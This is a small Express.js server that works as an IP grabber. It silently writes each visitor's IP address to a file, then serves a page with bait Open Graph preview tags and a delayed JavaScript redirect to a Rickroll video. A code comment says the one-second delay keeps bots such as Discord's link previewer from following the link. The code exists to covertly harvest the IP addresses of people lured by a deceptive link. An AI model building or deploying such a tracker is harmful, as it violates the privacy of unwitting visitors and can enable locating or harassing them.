const express = require("express");
const fs = require("fs");
const app = express();

app.set("trust proxy", true);

app.get("/", (req, res) => {
  const ip = req.ip;
  console.log("IP logged:", ip);
  fs.appendFileSync("ips.txt", ip + "\n");

  // Serve HTML that redirects using JS (not an HTTP redirect)
  res.send(`
    <!DOCTYPE html>
    <html>
      <head>
        <meta charset="UTF-8">
        <title>Loading...</title>
        <meta name="description" content="Cool project site!">
        <meta property="og:title" content="Important Link">
        <meta property="og:description" content="Check this out. You’ll love it.">
        <meta property="og:image" content="https://example.com/fake-image.png">
        <meta property="og:type" content="website">
        <script>
          // Delay redirect so bots (like Discord) don't follow
          setTimeout(function() {
            window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
          }, 1000); // 1 second delay
        </script>
      </head>
      <body>
        <p>Loading, please wait...</p>
      </body>
    </html>
  `);
});

const port = process.env.PORT || 3000;
app.listen(port, () => {
  console.log("Listening on port", port);
});
